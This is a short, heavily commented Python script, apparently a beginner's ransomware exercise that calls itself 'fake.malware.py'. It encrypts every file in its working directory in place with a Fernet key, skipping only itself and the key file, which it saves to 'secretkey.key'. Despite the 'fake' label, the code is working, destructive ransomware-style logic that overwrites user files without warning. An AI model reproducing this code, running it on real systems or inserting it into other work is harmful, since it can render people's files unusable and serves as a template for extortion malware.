import os
# Importing Fernet recipe to use for encryption
from cryptography.fernet import Fernet

# here we will be looking for some files
files = []

#for loop to create look for the files,
# 1st if statement used to skip over our script; 
# we also added an or logical operator so that we don't encrypt our key
# 2nd if statement used to only put files into our list, which are the files we want to encrypt
for file in os.listdir():
    if file == "fake.malware.py" or file == "secretkey.key":
        continue
#Here we will add the variable file to our "files" list above by appending
    if os.path.isfile(file):
        files.append(file)


print (files)

# Creating our encryption key
key = Fernet.generate_key()

# Saving our key to a file
# we are using the function "thekey" to write to our variable "key" above. 
with open("secretkey.key", "wb") as thekey:
    thekey.write(key)

# This for loop will check every file in the variable files 
# Then we are opening the files in read binary with our function "thefile" 
# Then we are using the variable "contents" to be equal to thefile.read
# Then we are opening the files and encrypting them with fernet
# And then lastly we are writing back to the files with the encryption done above
for file in files:
    with open(file, "rb") as thefile:
        contents = thefile.read()
    contents_encrypted = Fernet(key).encrypt(contents)
    with open(file, "wb") as thefile:
        thefile.write(contents_encrypted)